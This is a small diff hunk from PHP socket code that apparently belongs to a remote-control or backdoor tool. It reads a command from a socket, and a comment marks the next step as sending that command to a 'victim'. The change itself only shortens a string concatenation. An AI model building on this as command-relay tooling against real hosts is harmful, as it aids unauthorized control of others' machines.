@@ -66,7 +66,7 @@
                 # Read command
                 $command = "";
                 while($out = socket_read($msgsock, 2048)) {
-                    $command = $command . $out;
+                    $command .= $out;
                 }
 
                 # Send command to victim
